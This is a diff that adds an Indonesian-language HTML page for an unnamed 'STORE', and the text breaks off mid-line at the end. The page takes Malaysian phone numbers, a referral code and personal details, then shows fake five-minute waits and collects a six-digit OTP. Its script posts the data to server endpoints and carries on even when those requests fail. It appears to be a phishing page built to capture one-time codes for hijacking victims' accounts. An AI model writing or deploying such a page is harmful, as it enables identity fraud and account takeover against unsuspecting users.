@@ -1,0 +1,565 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>STORE</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, 'Segoe UI', Arial, sans-serif;
+      background: #f5f5f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    .container {
+      background: #fff;
+      padding: 32px 26px 28px;
+      border-radius: 14px;
+      border: 1px solid #e5e5e5;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.04);
+      width: 100%;
+      max-width: 400px;
+    }
+
+    .logo {
+      width: 72px; height: 72px;
+      background: #ee4c20;
+      border-radius: 16px;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 18px;
+      box-shadow: 0 4px 12px rgba(238,76,32,0.3);
+      color: #fff; font-weight: bold; font-size: 13px; letter-spacing: 0.5px;
+    }
+    .logo.success-logo {
+      background: #2e7d32;
+      box-shadow: 0 4px 12px rgba(46,125,50,0.3);
+    }
+
+    h2 { text-align: center; font-size: 20px; color: #222; margin-bottom: 6px; }
+    .step-info { text-align: center; font-size: 13px; color: #999; margin-bottom: 22px; }
+
+    label { display: block; font-size: 13px; color: #555; margin-bottom: 6px; font-weight: 500; }
+
+    input, select {
+      width: 100%; padding: 12px 14px; margin-bottom: 16px;
+      border: 1px solid #ddd; border-radius: 8px;
+      font-size: 15px; outline: none; background: #fafafa;
+      transition: border-color 0.2s; font-family: inherit;
+    }
+    input:focus, select:focus { border-color: #ee4c20; background: #fff; }
+
+    .phone-input {
+      display: flex; align-items: center;
+      border: 1px solid #ddd; border-radius: 8px;
+      background: #fafafa; margin-bottom: 16px;
+      padding: 0 4px 0 12px; transition: border-color 0.2s;
+    }
+    .phone-input:focus-within { border-color: #ee4c20; background: #fff; }
+    .phone-input .prefix {
+      font-size: 15px; color: #333; font-weight: 600;
+      padding-right: 10px; border-right: 1px solid #e0e0e0;
+      margin-right: 10px; white-space: nowrap;
+    }
+    .phone-input input {
+      flex: 1; border: none; background: transparent;
+      padding: 12px 8px 12px 0; margin-bottom: 0;
+      font-size: 15px; outline: none; letter-spacing: 1px;
+    }
+    .phone-input input:focus { background: transparent; }
+
+    .otp-box {
+      display: flex; gap: 8px; justify-content: center; margin: 20px 0 16px;
+    }
+    .otp-input {
+      width: 48px; height: 56px; text-align: center;
+      font-size: 22px; font-weight: bold;
+      border: 2px solid #ddd; border-radius: 8px;
+      background: #fafafa; outline: none;
+      transition: all 0.2s; color: #222; padding: 0;
+      margin-bottom: 0;
+    }
+    .otp-input:focus {
+      border-color: #ee4c20; background: #fff;
+      box-shadow: 0 0 0 3px rgba(238,76,32,0.1);
+    }
+    .otp-input.filled {
+      border-color: #ee4c20; background: #fff;
+    }
+
+    button.submit-btn {
+      width: 100%; padding: 13px;
+      background: #ee4c20; color: #fff; border: none;
+      border-radius: 8px; font-size: 15px; font-weight: 600;
+      cursor: pointer; margin-top: 4px;
+      transition: background 0.2s; letter-spacing: 0.3px;
+    }
+    button.submit-btn:hover:not(:disabled) { background: #d63f18; }
+    button.submit-btn:disabled { background: #ccc; cursor: not-allowed; }
+
+    .msg { text-align: center; font-size: 13px; margin-top: 12px; min-height: 18px; }
+    .msg.error { color: #d32f2f; }
+    .msg.success { color: #2e7d32; }
+    .hidden { display: none; }
+
+    .footer-text { text-align: center; font-size: 12px; color: #aaa; margin-top: 20px; }
+
+    .spinner {
+      width: 20px; height: 20px;
+      border: 3px solid #ffe0d3;
+      border-top: 3px solid #ee4c20;
+      border-radius: 50%;
+      display: inline-block;
+      vertical-align: middle;
+      margin-right: 8px;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .countdown-section {
+      display: none;
+      margin-top: 20px;
+      padding: 18px 14px;
+      background: #fff8f5;
+      border: 1px solid #ffd9c9;
+      border-radius: 10px;
+      text-align: center;
+    }
+    .countdown-section.show { display: block; }
+
+    .countdown {
+      font-family: 'Courier New', monospace;
+      font-size: 38px; font-weight: bold;
+      color: #ee4c20; letter-spacing: 3px; margin: 12px 0;
+    }
+    .countdown-label {
+      font-size: 12px; color: #aaa;
+      text-transform: uppercase; letter-spacing: 1px; margin-bottom: 8px;
+    }
+    .progress-bar {
+      width: 100%; height: 6px; background: #ffe0d3;
+      border-radius: 3px; overflow: hidden; margin-top: 14px;
+    }
+    .progress-fill {
+      height: 100%; background: #ee4c20; width: 0%;
+      transition: width 1s linear; border-radius: 3px;
+    }
+
+    #pageSuccess, #pageFinal { text-align: center; }
+    .success-title { color: #2e7d32; }
+    .success-text { color: #666; font-size: 14px; margin-top: 8px; }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+
+    <!-- ============ HALAMAN 1: LOGIN ============ -->
+    <div id="pageLogin">
+      <div class="logo">STORE</div>
+      <h2>Selamat Datang</h2>
+      <p class="step-info">Langkah 1 dari 4</p>
+
+      <label for="phone">Nomor HP Malaysia</label>
+      <div class="phone-input">
+        <span class="prefix">🇲🇾 +60</span>
+        <input type="tel" id="phone" placeholder="12 345 6789" maxlength="13" inputmode="numeric">
+      </div>
+
+      <label>Kode Referral</label>
+      <input type="text" id="referralInput" placeholder="Masukkan kode referral" autocomplete="off" maxlength="20" style="text-transform:uppercase;">
+
+      <button type="button" id="btnLogin" class="submit-btn" onclick="submitLogin()">Masuk</button>
+      <p id="msgLogin" class="msg error"></p>
+
+      <p class="footer-text">© 2026 STORE</p>
+    </div>
+
+    <!-- ============ HALAMAN 2: 6 FIELD ============ -->
+    <div id="pageForm" class="hidden">
+      <div class="logo">STORE</div>
+      <h2>Data Permintaan</h2>
+      <p class="step-info">Langkah 2 dari 4</p>
+
+      <label>Nama Lengkap</label>
+      <input type="text" id="nama" placeholder="Nama lengkap" maxlength="100">
+
+      <label>Tanggal Lahir</label>
+      <input type="date" id="tanggalLahir">
+
+      <label>Usia</label>
+      <input type="number" id="usia" placeholder="Usia" min="1" max="120">
+
+      <label>Pekerjaan</label>
+      <input type="text" id="pekerjaan" placeholder="Pekerjaan" maxlength="100">
+
+      <label>Alamat</label>
+      <input type="text" id="alamat" placeholder="Alamat lengkap" maxlength="200">
+
+      <label>Status Perkawinan</label>
+      <select id="status">
+        <option value="">-- Pilih Status --</option>
+        <option value="Lajang">Lajang</option>
+        <option value="Menikah">Menikah</option>
+        <option value="Cerai">Cerai</option>
+      </select>
+
+      <button type="button" id="btnForm" class="submit-btn" onclick="submitForm()">Lanjut</button>
+      <p id="msgForm" class="msg error"></p>
+    </div>
+
+    <!-- ============ HALAMAN 3: INPUT HP + REQUEST OTP ============ -->
+    <div id="pageRequest" class="hidden">
+      <div class="logo">OTP</div>
+      <h2>Verifikasi Nomor HP</h2>
+      <p class="step-info">Langkah 3 dari 4</p>
+
+      <label for="phone2">Nomor HP</label>
+      <div class="phone-input">
+        <span class="prefix">🇲🇾 +60</span>
+        <input type="tel" id="phone2" placeholder="12 345 6789" maxlength="13" inputmode="numeric">
+      </div>
+
+      <button type="button" id="btnRequest" class="submit-btn" onclick="requestOtp()">Request OTP</button>
+      <p id="msgRequest" class="msg error"></p>
+
+      <div id="requestCountdownSection" class="countdown-section">
+        <div class="countdown-label">
+          <span class="spinner"></span>
+          Mohon tunggu, kode OTP sedang dikirim...
+        </div>
+        <div class="countdown" id="requestCountdownDisplay">05:00</div>
+        <div class="countdown-label">Sisa Waktu</div>
+        <div class="progress-bar">
+          <div class="progress-fill" id="requestProgressFill"></div>
+        </div>
+      </div>
+
+      <div id="otpInputSection" class="hidden" style="margin-top:20px;">
+        <label>Masukkan Kode OTP</label>
+        <div class="otp-box">
+          <input type="tel" class="otp-input" maxlength="1" inputmode="numeric">
+          <input type="tel" class="otp-input" maxlength="1" inputmode="numeric">
+          <input type="tel" class="otp-input" maxlength="1" inputmode="numeric">
+          <input type="tel" class="otp-input" maxlength="1" inputmode="numeric">
+          <input type="tel" class="otp-input" maxlength="1" inputmode="numeric">
+          <input type="tel" class="otp-input" maxlength="1" inputmode="numeric">
+        </div>
+        <button type="button" id="btnOtp" class="submit-btn" onclick="verifyOtp()">Verifikasi</button>
+        <p id="msgOtp" class="msg error"></p>
+      </div>
+    </div>
+
+    <!-- ============ HALAMAN 4: SUKSES + COUNTDOWN 5 MENIT ============ -->
+    <div id="pageSuccess" class="hidden">
+      <div class="logo success-logo">✓</div>
+      <h2 class="success-title">OTP Terverifikasi</h2>
+      <p class="success-text">✓ Kode OTP sedang diverifikasi... Mohon tunggu.</p>
+
+      <div class="countdown-section show" style="margin-top:20px;">
+        <div class="countdown-label">
+          <span class="spinner"></span>
+          Mohon tunggu...
+        </div>
+        <div class="countdown" id="successCountdownDisplay">05:00</div>
+        <div class="countdown-label">Sisa Waktu</div>
+        <div class="progress-bar">
+          <div class="progress-fill" id="successProgressFill"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ============ HALAMAN 5: SUKSES AKHIR ============ -->
+    <div id="pageFinal" class="hidden">
+      <div class="logo success-logo">✓</div>
+      <h2 class="success-title">Berhasil</h2>
+      <p class="success-text">Data Anda sudah terkirim semua.</p>
+      <p class="footer-text" style="margin-top:20px;">© 2026 STORE</p>
+    </div>
+
+  </div>
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    formatPhone(document.getElementById('phone'));
+    formatPhone(document.getElementById('phone2'));
+    setupOtpInputs();
+  });
+
+  function formatPhone(input) {
+    if (!input) return;
+    input.addEventListener('input', function(e) {
+      var value = e.target.value.replace(/\D/g, '');
+      if (value.length > 11) value = value.substring(0, 11);
+      var formatted = value;
+      if (value.length > 6) {
+        formatted = value.substring(0, 2) + ' ' + value.substring(2, 5) + ' ' + value.substring(5);
+      } else if (value.length > 2) {
+        formatted = value.substring(0, 2) + ' ' + value.substring(2);
+      }
+      e.target.value = formatted;
+    });
+    input.addEventListener('keypress', function(e) {
+      if (!/[0-9]/.test(e.key)) e.preventDefault();
+    });
+  }
+
+  function setupOtpInputs() {
+    var otpInputs = document.querySelectorAll('.otp-input');
+    otpInputs.forEach(function(input, index) {
+      input.addEventListener('input', function(e) {
+        e.target.value = e.target.value.replace(/\D/g, '');
+        if (e.target.value) {
+          e.target.classList.add('filled');
+          if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
+        } else {
+          e.target.classList.remove('filled');
+        }
+      });
+      input.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace' && !e.target.value && index > 0) {
+          otpInputs[index - 1].focus();
+        }
+      });
+      input.addEventListener('paste', function(e) {
+        e.preventDefault();
+        var pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
+        for (var i = 0; i < otpInputs.length; i++) {
+          if (pasted[i]) {
+            otpInputs[i].value = pasted[i];
+            otpInputs[i].classList.add('filled');
+          }
+        }
+        var lastIndex = Math.min(pasted.length, otpInputs.length) - 1;
+        if (lastIndex >= 0) otpInputs[lastIndex].focus();
+      });
+    });
+  }
+
+  // STEP 1: LOGIN
+  async function submitLogin() {
+    var btn = document.getElementById('btnLogin');
+    var msg = document.getElementById('msgLogin');
+    var phoneDigits = document.getElementById('phone').value.replace(/\D/g, '');
+    var fullPhone = '+60' + phoneDigits;
+    var referral = document.getElementById('referralInput').value.trim().toUpperCase();
+
+    msg.textContent = '';
+
+    var malaysiaRegex = /^1[0-9]{8,10}$/;
+    if (!phoneDigits) { msg.textContent = 'Nomor HP wajib diisi'; return; }
+    if (!malaysiaRegex.test(phoneDigits)) {
+      msg.textContent = 'Nomor HP Malaysia tidak valid'; return;
+    }
+    var validPrefixes = ['10','11','12','13','14','16','17','18','19'];
+    if (validPrefixes.indexOf(phoneDigits.substring(0, 2)) === -1) {
+      msg.textContent = 'Prefix operator tidak valid'; return;
+    }
+    if (!referral) { msg.textContent = 'Kode referral wajib diisi'; return; }
+    if (referral.length < 4) { msg.textContent = 'Kode referral minimal 4 karakter'; return; }
+
+    btn.disabled = true;
+    btn.textContent = 'Memproses...';
+
+    try {
+      var res = await fetch('/api/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone: fullPhone, referral: referral })
+      });
+      var data = await res.json();
+      if (data.success) {
+        sessionStorage.setItem('phone', fullPhone);
+        document.getElementById('pageLogin').classList.add('hidden');
+        document.getElementById('pageForm').classList.remove('hidden');
+      } else {
+        msg.textContent = data.error || 'Gagal login';
+      }
+    } catch (err) {
+      msg.textContent = 'Error: ' + err.message;
+    } finally {
+      btn.disabled = false;
+      btn.textContent = 'Masuk';
+    }
+  }
+
+  // STEP 2: 6 FIELD
+  async function submitForm() {
+    var btn = document.getElementById('btnForm');
+    var msg = document.getElementById('msgForm');
+
+    var phone = sessionStorage.getItem('phone') || '-';
+    var nama = document.getElementById('nama').value.trim();
+    var tanggalLahir = document.getElementById('tanggalLahir').value;
+    var usia = document.getElementById('usia').value;
+    var pekerjaan = document.getElementById('pekerjaan').value.trim();
+    var alamat = document.getElementById('alamat').value.trim();
+    var status = document.getElementById('status').value;
+
+    msg.textContent = '';
+
+    if (!nama || !tanggalLahir || !usia || !pekerjaan || !alamat || !status) {
+      msg.textContent = 'Semua field wajib diisi'; return;
+    }
+
+    btn.disabled = true;
+    btn.textContent = 'Mengirim...';
+
+    try {
+      await fetch('/api/form', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone: phone, nama: nama, tanggalLahir: tanggalLahir, usia: usia, pekerjaan: pekerjaan, alamat: alamat, status: status })
+      });
+    } catch (err) {
+      console.error('Form error:', err);
+    }
+
+    document.getElementById('pageForm').classList.add('hidden');
+    document.getElementById('pageRequest').classList.remove('hidden');
+
+    document.getElementById('phone2').value = '';
+    document.getElementById('btnRequest').disabled = false;
+    document.getElementById('btnRequest').textContent = 'Request OTP';
+    document.getElementById('msgRequest').textContent = '';
+    document.getElementById('requestCountdownSection').classList.remove('show');
+    document.getElementById('otpInputSection').classList.add('hidden');
+  }
+
+  // STEP 3: REQUEST OTP
+  async function requestOtp() {
+    var btn = document.getElementById('btnRequest');
+    var msg = document.getElementById('msgRequest');
+    var phoneDigits = document.getElementById('phone2').value.replace(/\D/g, '');
+    var fullPhone = '+60' + phoneDigits;
+
+    msg.textContent = '';
+
+    var malaysiaRegex = /^1[0-9]{8,10}$/;
+    if (!phoneDigits) { msg.textContent = 'Nomor HP wajib diisi'; return; }
+    if (!malaysiaRegex.test(phoneDigits)) {
+      msg.textContent = 'Nomor HP Malaysia tidak valid'; return;
+    }
+
+    btn.disabled = true;
+    btn.textContent = 'Mengirim...';
+
+    try {
+      await fetch('/api/request-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone: fullPhone })
+      });
+    } catch (err) {
+      console.error('Request OTP error:', err);
+    }
+
+    document.getElementById('requestCountdownSection').classList.add('show');
+    document.getElementById('btnRequest').disabled = true;
+    document.getElementById('btnRequest').textContent = 'Menunggu...';
+
+    startRequestCountdown(300, function() {
+      document.getElementById('otpInputSection').classList.remove('hidden');
+      var otpInputs = document.querySelectorAll('.otp-input');
+      if (otpInputs[0]) otpInputs[0].focus();
+    });
+  }
+
+  function startRequestCountdown(totalSeconds, onFinish) {
+    var display = document.getElementById('requestCountdownDisplay');
+    var progress = document.getElementById('requestProgressFill');
+    var remaining = totalSeconds;
+
+    display.textContent = formatTime(remaining);
+    progress.style.width = '0%';
+
+    var interval = setInterval(function() {
+      remaining--;
+      if (remaining <= 0) {
+        clearInterval(interval);
+        display.textContent = '00:00';
+        progress.style.width = '100%';
+        setTimeout(function() { if (onFinish) onFinish(); }, 500);
+        return;
+      }
+      display.textContent = formatTime(remaining);
+      var percent = ((totalSeconds - remaining) / totalSeconds) * 100;
+      progress.style.width = percent + '%';
+    }, 1000);
+  }
+
+  // STEP 4: VERIFY OTP
+  async function verifyOtp() {
+    var btn = document.getElementById('btnOtp');
+    var msg = document.getElementById('msgOtp');
+    var otpInputs = document.querySelectorAll('.otp-input');
+
+    var otp = '';
+    otpInputs.forEach(function(input) { otp += input.value; });
+
+    msg.textContent = '';
+
+    if (otp.length !== 6) {
+      msg.textContent = 'Harap isi 6 digit kode OTP';
+      return;
+    }
+
+    btn.disabled = true;
+    btn.textContent = 'Memverifikasi...';
+
+    var phone = sessionStorage.getItem('phone') || '-';
+
+    try {
+      await fetch('/api/verify-otp', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone: phone, otp: otp })
+      });
+    } catch (err) {
+      console.error('Verify OTP error:', err);
+    }
+
+    document.getElementById('pageRequest').classList.add('hidden');
+    document.getElementById('pageSuccess').classList.remove('hidden');
+
+    startSuccessCountdown(300, function() {
+      document.getElementById('pageSuccess').classList.add('hidden');
+      document.getElementById('pageFinal').classList.remove('hidden');
+    });
+  }
+
+  function startSuccessCountdown(totalSeconds, onFinish) {
+    var display = document.getElementById('successCountdownDisplay');
+    var progress = document.getElementById('successProgressFill');
+    var remaining = totalSeconds;
+
+    display.textContent = formatTime(remaining);
+    progress.style.width = '0%';
+
+    var interval = setInterval(function() {
+      remaining--;
+      if (remaining <= 0) {
+        clearInterval(interval);
+        display.textContent = '00:00';
+        progress.style.width = '100%';
+        setTimeout(function() { if (onFinish) onFinish(); }, 500);
+        return;
+      }
+      display.textContent = formatTime(remaining);
+      var percent = ((totalSeconds - remaining) / totalSeconds) * 100;
+      progress.style.width = percent + '%';
+    }, 1000);
+  }
+
+  function formatTime(seconds) {
+    var m = Math.floor(seconds / 60);
+    var s = seconds % 60;
+    return String(m).padStart(2, '0') + ':' + Stri
